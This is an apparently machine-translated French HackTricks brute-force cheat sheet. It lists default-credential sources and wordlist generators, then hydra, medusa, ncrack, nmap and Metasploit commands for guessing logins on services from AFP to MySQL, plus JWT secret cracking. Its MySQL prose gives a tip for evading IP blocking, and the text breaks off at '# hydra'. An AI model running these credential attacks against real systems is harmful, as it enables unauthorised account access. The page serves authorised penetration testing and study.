# Brute Force - CheatSheet

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Identifiants par défaut

**Recherchez sur Google** les identifiants par défaut de la technologie utilisée, ou **essayez ces liens** :

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Créez vos propres dictionnaires**

Trouvez autant d'informations que possible sur la cible et générez un dictionnaire personnalisé. Des outils qui peuvent aider :

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl est un outil de génération de listes de mots-clés à partir de pages Web. Il analyse le contenu des pages et extrait les mots-clés pertinents. Cela peut être utile lors de l'exécution d'une attaque de force brute, car cela permet de générer une liste de mots-clés potentiels à utiliser comme mots de passe.

Pour utiliser Cewl, vous devez spécifier l'URL de la page Web à analyser et le nombre de mots-clés à extraire. L'outil parcourt ensuite la page, extrait les mots-clés et les enregistre dans un fichier texte.

Cewl peut être utilisé de différentes manières lors d'une attaque de force brute. Par exemple, vous pouvez utiliser les mots-clés extraits comme base pour générer des combinaisons de mots de passe. Vous pouvez également utiliser les mots-clés pour créer des dictionnaires personnalisés à utiliser avec des outils de force brute.

Il est important de noter que l'utilisation de Cewl pour générer des mots de passe lors d'une attaque de force brute est une méthode de piratage illégale et non éthique. Cependant, l'outil peut également être utilisé à des fins légitimes, telles que l'analyse de la sécurité d'un site Web ou la création de dictionnaires pour des tests de pénétration autorisés.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Générer des mots de passe basés sur vos connaissances sur la victime (noms, dates...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Un outil de génération de listes de mots qui vous permet de fournir un ensemble de mots, vous donnant la possibilité de créer plusieurs variations à partir des mots donnés, créant ainsi une liste de mots unique et idéale à utiliser pour une cible spécifique.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Listes de mots

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.io/) pour créer facilement et **automatiser des flux de travail** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Services

Classés par ordre alphabétique selon le nom du service.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

L'AJP (Apache JServ Protocol) est un protocole de communication utilisé pour la communication entre un serveur web Apache et un conteneur de servlets. Il est principalement utilisé pour les applications Java basées sur le serveur web Apache.

L'attaque par force brute AJP est une technique utilisée pour tenter de deviner les informations d'identification d'un serveur AJP en essayant différentes combinaisons de noms d'utilisateur et de mots de passe. Cette attaque peut être utilisée pour accéder illégalement à un serveur AJP et compromettre la sécurité du système.

Pour mener une attaque par force brute AJP, un attaquant utilise généralement des outils automatisés qui testent de manière itérative différentes combinaisons de noms d'utilisateur et de mots de passe jusqu'à ce qu'ils trouvent les bonnes informations d'identification. Cette méthode est souvent utilisée lorsque l'attaquant n'a pas d'informations spécifiques sur les informations d'identification du serveur AJP.

Pour se protéger contre les attaques par force brute AJP, il est recommandé de mettre en place des mesures de sécurité telles que la limitation du nombre de tentatives de connexion, l'utilisation de mots de passe forts et la surveillance des journaux d'accès pour détecter toute activité suspecte.

Il est important de noter que l'attaque par force brute AJP est une activité illégale et non éthique. Elle est strictement réservée aux professionnels de la sécurité informatique et doit être utilisée uniquement dans le cadre d'un test d'intrusion autorisé.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
### Cassandra

Cassandra est une base de données distribuée hautement évolutive, conçue pour gérer de gros volumes de données sur de nombreux serveurs, offrant une haute disponibilité et une tolérance aux pannes. Elle utilise un modèle de données colonne et est conçue pour être résiliente aux pannes matérielles et aux pannes de réseau.

#### Brute Force

La méthode de force brute est une technique utilisée pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Cette méthode est souvent utilisée lorsque d'autres méthodes, telles que l'ingénierie sociale ou l'utilisation de vulnérabilités logicielles, ne sont pas disponibles ou ne sont pas efficaces.

La force brute peut être utilisée pour attaquer des systèmes tels que des comptes utilisateur, des services en ligne ou des réseaux sans fil. Elle peut être réalisée à l'aide d'outils automatisés qui génèrent et testent automatiquement les combinaisons de mots de passe, ou elle peut être effectuée manuellement en essayant différentes combinaisons de mots de passe.

Il est important de noter que la force brute est une méthode de piratage illégale et non éthique, et son utilisation peut entraîner des conséquences juridiques graves. Il est donc essentiel de respecter les lois et les réglementations en vigueur lors de l'utilisation de techniques de piratage.
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
# CouchDB

CouchDB est une base de données NoSQL open source qui utilise JSON pour stocker les données. Elle est conçue pour être distribuée et tolérante aux pannes, ce qui signifie qu'elle peut fonctionner sur plusieurs serveurs et résister à la défaillance d'un ou plusieurs d'entre eux.

CouchDB utilise une approche de réplication bidirectionnelle, ce qui signifie que les données peuvent être synchronisées entre plusieurs instances de CouchDB. Cela permet une haute disponibilité des données et facilite la mise en place de clusters de bases de données.

Lorsqu'il s'agit de pirater CouchDB, l'une des méthodes les plus courantes est l'attaque par force brute. Cette technique consiste à essayer toutes les combinaisons possibles de noms d'utilisateur et de mots de passe jusqu'à ce que la bonne combinaison soit trouvée.

Pour mener une attaque par force brute sur CouchDB, vous pouvez utiliser des outils tels que Hydra ou Medusa. Ces outils automatisent le processus en testant rapidement de nombreuses combinaisons différentes.

Il est important de noter que l'attaque par force brute est une méthode d'attaque très lente et inefficace, surtout si des mesures de sécurité appropriées sont en place, telles que des politiques de mot de passe solides et des mécanismes de verrouillage des comptes après un certain nombre de tentatives infructueuses.

Il est recommandé de mettre en œuvre des mesures de sécurité supplémentaires pour protéger CouchDB contre les attaques par force brute, telles que la mise en place d'un pare-feu pour limiter l'accès aux serveurs CouchDB, l'utilisation de certificats SSL pour chiffrer les communications et la configuration de CouchDB pour enregistrer les tentatives de connexion infructueuses.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Registre Docker

Le registre Docker est un service qui permet de stocker et de distribuer des images Docker. Il peut être utilisé pour héberger des images personnalisées ou pour accéder à des images publiques disponibles sur Internet. Le registre Docker est essentiel pour le déploiement et la gestion des conteneurs Docker.

#### Attaque par force brute

L'attaque par force brute est une technique utilisée pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Dans le contexte du registre Docker, une attaque par force brute peut être utilisée pour essayer de deviner les informations d'identification d'un utilisateur afin de compromettre le registre.

#### Méthodologie

Pour mener une attaque par force brute sur un registre Docker, les étapes suivantes peuvent être suivies :

1. Collecte d'informations : Collectez des informations sur le registre Docker cible, telles que l'URL, les noms d'utilisateur valides, etc.

2. Sélection d'un outil : Choisissez un outil d'attaque par force brute adapté, tel que Hydra ou Medusa.

3. Configuration de l'outil : Configurez l'outil en spécifiant l'URL du registre Docker, les noms d'utilisateur à tester et les listes de mots de passe à utiliser.

4. Lancement de l'attaque : Lancez l'attaque en exécutant l'outil sélectionné. L'outil tentera de deviner les informations d'identification en essayant différentes combinaisons de noms d'utilisateur et de mots de passe.

5. Analyse des résultats : Analysez les résultats de l'attaque pour identifier les informations d'identification valides qui ont été trouvées.

6. Exploitation des informations d'identification : Une fois les informations d'identification valides obtenues, elles peuvent être utilisées pour accéder au registre Docker et effectuer des actions malveillantes, telles que la modification ou la suppression d'images.

#### Contre-mesures

Pour se protéger contre les attaques par force brute sur un registre Docker, les mesures suivantes peuvent être prises :

- Utiliser des mots de passe forts : Utilisez des mots de passe complexes et uniques pour les comptes d'utilisateur du registre Docker.

- Limiter les tentatives de connexion : Mettez en place des mécanismes de verrouillage de compte ou de limitation des tentatives de connexion pour empêcher les attaques par force brute.

- Surveiller les journaux d'activité : Surveillez les journaux d'activité du registre Docker pour détecter toute activité suspecte ou tentatives d'attaque.

- Mettre à jour régulièrement : Assurez-vous de maintenir le registre Docker à jour avec les dernières mises à jour de sécurité pour éviter les vulnérabilités connues.

En suivant ces contre-mesures, vous pouvez renforcer la sécurité de votre registre Docker et réduire les risques d'attaques par force brute.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
# Elasticsearch

Elasticsearch est un moteur de recherche et d'analyse de données distribué, basé sur Apache Lucene. Il est conçu pour être rapide, évolutif et facile à utiliser. Elasticsearch est souvent utilisé pour l'indexation et la recherche de grands volumes de données non structurées, tels que des logs, des documents JSON et des données textuelles.

## Brute Force

La méthode de force brute est une technique utilisée pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Cette méthode est souvent utilisée lorsque les autres méthodes de récupération de mot de passe échouent. La force brute peut être utilisée pour attaquer des systèmes tels que des serveurs, des applications web et des comptes utilisateur.

Lorsqu'il s'agit d'Elasticsearch, la force brute peut être utilisée pour tenter de deviner les identifiants d'accès à un cluster Elasticsearch. Cela peut être fait en essayant différentes combinaisons de noms d'utilisateur et de mots de passe jusqu'à ce que les bonnes informations d'identification soient trouvées. Il est important de noter que l'utilisation de la force brute pour accéder à un système sans autorisation est illégale et peut entraîner des conséquences juridiques.

Pour se protéger contre les attaques par force brute, il est recommandé de mettre en place des mesures de sécurité telles que l'utilisation de mots de passe forts, la limitation du nombre de tentatives de connexion et la mise en place de mécanismes de verrouillage de compte après un certain nombre de tentatives infructueuses.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

Le protocole FTP (File Transfer Protocol) est un protocole standard utilisé pour transférer des fichiers entre un client et un serveur sur un réseau. Il est largement utilisé pour le partage de fichiers et la gestion de sites web.

#### Attaque par force brute

L'attaque par force brute est une technique couramment utilisée pour tenter de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce que la bonne soit trouvée. Dans le contexte du protocole FTP, une attaque par force brute peut être utilisée pour essayer de deviner le mot de passe d'un compte FTP en essayant différentes combinaisons de caractères.

#### Méthodologie

Voici une méthodologie générale pour mener une attaque par force brute sur un serveur FTP :

1. Identifier la cible : déterminer l'adresse IP ou le nom de domaine du serveur FTP que vous souhaitez attaquer.
2. Collecter des informations : recueillir des informations sur le serveur FTP, telles que le port utilisé, les noms d'utilisateur valides, etc.
3. Sélectionner un outil : choisir un outil d'attaque par force brute FTP, tel que Hydra ou Medusa.
4. Configurer l'outil : spécifier les paramètres de l'attaque, tels que l'adresse IP de la cible, le port, les noms d'utilisateur à essayer, etc.
5. Lancer l'attaque : exécuter l'outil d'attaque par force brute pour essayer différentes combinaisons de mots de passe.
6. Analyser les résultats : analyser les résultats de l'attaque pour déterminer si un mot de passe valide a été trouvé.
7. Accéder au compte FTP : si un mot de passe valide est trouvé, utiliser les informations d'identification pour accéder au compte FTP et effectuer les actions souhaitées.

#### Prévention

Pour se protéger contre les attaques par force brute FTP, il est recommandé de prendre les mesures suivantes :

- Utiliser des mots de passe forts : choisir des mots de passe longs et complexes qui sont difficiles à deviner.
- Limiter les tentatives de connexion : configurer le serveur FTP pour limiter le nombre de tentatives de connexion autorisées avant de bloquer l'adresse IP de l'attaquant.
- Utiliser des outils de détection d'intrusion : mettre en place des outils de détection d'intrusion pour surveiller les activités suspectes et bloquer les attaques par force brute.
- Mettre à jour régulièrement : maintenir le serveur FTP à jour avec les derniers correctifs de sécurité pour éviter les vulnérabilités connues.

En suivant ces bonnes pratiques de sécurité, vous pouvez réduire considérablement le risque d'une attaque par force brute FTP réussie.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### Brute force générique HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Authentification de base HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - Formulaire de soumission (POST)

L'attaque par force brute est une technique couramment utilisée pour tenter de deviner les informations d'identification d'un utilisateur en testant toutes les combinaisons possibles de mots de passe. Cette méthode peut être utilisée pour attaquer les formulaires de soumission HTTP.

L'attaque par force brute sur un formulaire de soumission HTTP consiste à envoyer des requêtes POST répétées au serveur, en essayant différentes valeurs pour les champs du formulaire, généralement le nom d'utilisateur et le mot de passe. L'attaquant utilise un programme automatisé pour envoyer ces requêtes, en modifiant les valeurs des champs à chaque itération.

Voici les étapes générales pour effectuer une attaque par force brute sur un formulaire de soumission HTTP :

1. Identifier le formulaire de soumission : Analysez la page web pour trouver le formulaire de soumission qui contient les champs à attaquer, tels que le champ du nom d'utilisateur et le champ du mot de passe.

2. Automatiser l'envoi des requêtes POST : Utilisez un programme ou un script pour envoyer des requêtes POST répétées au serveur, en modifiant les valeurs des champs à chaque itération. Vous pouvez utiliser des outils tels que cURL, Python Requests ou des extensions de navigateur pour automatiser ce processus.

3. Générer des combinaisons de mots de passe : Créez une liste de mots de passe possibles à tester. Vous pouvez utiliser des dictionnaires de mots de passe courants, des générateurs de mots de passe ou des techniques de génération personnalisées.

4. Tester les combinaisons de mots de passe : Pour chaque combinaison de nom d'utilisateur et de mot de passe, envoyez une requête POST au serveur en utilisant les valeurs correspondantes. Analysez ensuite la réponse du serveur pour déterminer si les informations d'identification sont valides.

5. Répéter jusqu'à succès ou échec : Continuez à tester les combinaisons de mots de passe jusqu'à ce que vous obteniez un succès (informations d'identification valides) ou un échec (toutes les combinaisons ont été testées sans succès).

Il est important de noter que l'attaque par force brute peut être une méthode lente et consommatrice de ressources, en particulier si le serveur met en place des mesures de sécurité pour détecter et bloquer les tentatives d'attaque. De plus, cette méthode est illégale et peut entraîner des conséquences juridiques graves. Elle ne doit être utilisée que dans le cadre d'un test de pénétration autorisé et éthique.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Pour http**s**, vous devez changer de "http-post-form" à "**https-post-form**"

### **HTTP - CMS --** (W)ordpress, (J)oomla ou (D)rupal ou (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
### IMAP

IMAP (Internet Message Access Protocol) est un protocole de messagerie électronique utilisé pour récupérer les e-mails à partir d'un serveur de messagerie. Contrairement au protocole POP3, qui télécharge les e-mails sur l'appareil local, IMAP permet aux utilisateurs de gérer leurs e-mails directement sur le serveur. Cela signifie que les modifications apportées aux e-mails, telles que la suppression ou le déplacement dans des dossiers, sont synchronisées avec le serveur. 

Lorsqu'il s'agit de piratage, IMAP peut être exploité en utilisant des techniques de force brute pour deviner les mots de passe des comptes de messagerie. La méthode de force brute consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le bon soit trouvé. Cela peut être fait en utilisant des outils automatisés qui testent rapidement de nombreuses combinaisons. 

Il est important de noter que l'utilisation de la force brute pour pirater des comptes de messagerie est illégale et peut entraîner des conséquences juridiques graves. Les pirates informatiques éthiques, également connus sous le nom de testeurs de pénétration, peuvent utiliser des techniques de force brute dans le cadre d'un test de sécurité autorisé pour évaluer la vulnérabilité d'un système.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
IRC (Internet Relay Chat) est un protocole de communication en temps réel largement utilisé pour la messagerie instantanée et les discussions en groupe. Il permet aux utilisateurs de se connecter à des serveurs IRC et de rejoindre des canaux de discussion pour communiquer avec d'autres utilisateurs. Les clients IRC sont disponibles pour une variété de plates-formes et offrent des fonctionnalités telles que la messagerie privée, les salons de discussion et la possibilité de partager des fichiers. IRC est souvent utilisé par les communautés en ligne, les développeurs de logiciels et les passionnés de technologie pour discuter, collaborer et obtenir de l'aide.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

L'iSCSI (Internet Small Computer System Interface) est un protocole de stockage en réseau qui permet aux ordinateurs de se connecter à des ressources de stockage distantes sur un réseau IP. Il permet aux utilisateurs d'accéder à des disques durs, des bandes magnétiques et d'autres périphériques de stockage à distance comme s'ils étaient connectés localement. L'iSCSI utilise le protocole TCP/IP pour transférer les données entre l'initiateur (l'ordinateur client) et la cible (le périphérique de stockage distant). Cette technologie est largement utilisée dans les environnements de stockage en réseau pour sa simplicité et sa flexibilité.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JSON Web Tokens (JWT) sont un moyen populaire d'authentification et d'échange de données sécurisé entre des parties. Ils sont généralement utilisés pour authentifier les utilisateurs dans les applications web et les services API.

Un JWT est composé de trois parties : l'en-tête, la charge utile et la signature. L'en-tête contient des informations sur le type de token et l'algorithme de signature utilisé. La charge utile contient les données que vous souhaitez échanger ou stocker. La signature est utilisée pour vérifier l'intégrité du token.

L'une des vulnérabilités courantes liées aux JWT est l'attaque par force brute. Cette attaque consiste à essayer toutes les combinaisons possibles de clés secrètes pour trouver la bonne. Les attaquants peuvent utiliser des dictionnaires de mots de passe couramment utilisés ou générer des clés aléatoires pour tenter de casser la signature du JWT.

Pour se protéger contre les attaques par force brute, il est important de choisir une clé secrète suffisamment longue et complexe. Il est également recommandé d'utiliser des algorithmes de hachage forts pour la signature du JWT. De plus, la mise en place de mécanismes de verrouillage des comptes après un certain nombre de tentatives infructueuses peut également aider à prévenir les attaques par force brute.

En résumé, les JWT sont un moyen pratique d'authentification et d'échange de données sécurisé, mais il est essentiel de prendre des mesures pour se protéger contre les attaques par force brute et de choisir des clés secrètes solides pour garantir la sécurité de vos applications et services.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) est un protocole de communication utilisé pour accéder et gérer des services d'annuaire. Il est couramment utilisé pour rechercher et authentifier des utilisateurs dans un système d'annuaire. Les attaques de force brute contre les serveurs LDAP sont une méthode courante utilisée par les hackers pour tenter de deviner les mots de passe des utilisateurs.

L'attaque de force brute consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le mot de passe correct soit trouvé. Les hackers utilisent souvent des dictionnaires de mots de passe couramment utilisés ou génèrent des mots de passe aléatoires pour mener cette attaque.

Pour se protéger contre les attaques de force brute LDAP, il est recommandé de mettre en place des politiques de mots de passe solides, d'utiliser des mécanismes d'authentification à deux facteurs et de limiter le nombre de tentatives de connexion autorisées. Il est également important de surveiller les journaux d'activité pour détecter toute activité suspecte et de mettre à jour régulièrement les serveurs LDAP avec les derniers correctifs de sécurité.
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT (Message Queuing Telemetry Transport) est un protocole de messagerie léger et ouvert qui est largement utilisé dans l'Internet des objets (IoT). Il est conçu pour les appareils à faible puissance et à faible bande passante, ce qui en fait un choix idéal pour les environnements où les ressources sont limitées.

Le protocole MQTT utilise un modèle de publication/abonnement, où les appareils clients peuvent publier des messages sur des sujets spécifiques et s'abonner à des sujets pour recevoir des messages. Cela permet une communication efficace et asynchrone entre les appareils connectés.

L'une des principales caractéristiques de MQTT est sa légèreté. Le protocole utilise un en-tête minimal et un faible surcoût de bande passante, ce qui le rend adapté aux connexions réseau à faible débit et à faible latence.

Cependant, en raison de sa simplicité, MQTT peut être vulnérable aux attaques par force brute. Une attaque par force brute consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le bon soit trouvé. Les attaquants peuvent utiliser des outils automatisés pour effectuer ces attaques et tenter d'accéder illégalement aux appareils MQTT.

Pour se protéger contre les attaques par force brute, il est recommandé d'utiliser des mots de passe forts et de limiter le nombre de tentatives de connexion. De plus, il est important de mettre en œuvre des mécanismes de sécurité tels que le chiffrement des communications et l'authentification des clients pour renforcer la sécurité de votre infrastructure MQTT.

En résumé, MQTT est un protocole de messagerie léger et largement utilisé dans l'IoT. Cependant, en raison de sa simplicité, il peut être vulnérable aux attaques par force brute. Il est donc essentiel de prendre des mesures de sécurité appropriées pour protéger vos appareils MQTT contre de telles attaques.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
### Mongo

Mongo est une base de données NoSQL populaire qui est souvent utilisée dans les applications web. Il est important de noter que Mongo est vulnérable aux attaques de force brute si des mesures de sécurité appropriées ne sont pas mises en place.

La force brute est une technique d'attaque où un attaquant essaie de deviner un mot de passe en essayant toutes les combinaisons possibles jusqu'à ce qu'il trouve la bonne. Dans le cas de Mongo, cela signifie essayer différentes combinaisons de noms d'utilisateur et de mots de passe jusqu'à ce que l'accès soit accordé.

Il existe plusieurs outils disponibles pour mener des attaques de force brute contre Mongo, tels que Hydra et Nmap. Ces outils peuvent être utilisés pour automatiser le processus d'essai de différentes combinaisons de noms d'utilisateur et de mots de passe.

Pour se protéger contre les attaques de force brute, il est recommandé de prendre les mesures suivantes :

- Utiliser des mots de passe forts et uniques pour les comptes Mongo.
- Mettre en place des politiques de verrouillage des comptes après un certain nombre de tentatives de connexion infructueuses.
- Utiliser des outils de détection d'intrusion pour surveiller les tentatives d'attaque de force brute.
- Mettre à jour régulièrement Mongo avec les derniers correctifs de sécurité.

En suivant ces bonnes pratiques de sécurité, vous pouvez réduire considérablement le risque d'une attaque de force brute réussie contre votre base de données Mongo.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

La méthode de force brute est une technique couramment utilisée pour tenter de deviner les mots de passe d'une base de données MySQL. Cette méthode consiste à essayer toutes les combinaisons possibles de mots de passe jusqu'à ce que le bon soit trouvé.

Il existe plusieurs outils disponibles pour effectuer une attaque de force brute sur une base de données MySQL. Certains de ces outils sont spécifiquement conçus pour MySQL, tandis que d'autres peuvent être utilisés pour attaquer différents types de bases de données.

Lors de l'exécution d'une attaque de force brute sur une base de données MySQL, il est important de prendre en compte certaines considérations. Tout d'abord, il est essentiel de disposer d'une liste de mots de passe couramment utilisés, car de nombreux utilisateurs choisissent des mots de passe faibles et prévisibles. De plus, il est recommandé de limiter le nombre de tentatives de connexion pour éviter de déclencher des mesures de sécurité, telles que le blocage de l'adresse IP.

Il est également important de noter que l'utilisation de la méthode de force brute pour accéder à une base de données MySQL sans autorisation est illégale et peut entraîner des conséquences juridiques graves. Par conséquent, il est essentiel de toujours obtenir une autorisation légale avant de procéder à une attaque de force brute.

En conclusion, la méthode de force brute est une technique couramment utilisée pour tenter de deviner les mots de passe d'une base de données MySQL. Cependant, il est important de respecter les lois et de prendre des précautions appropriées lors de l'utilisation de cette méthode.
```bash
# hydra
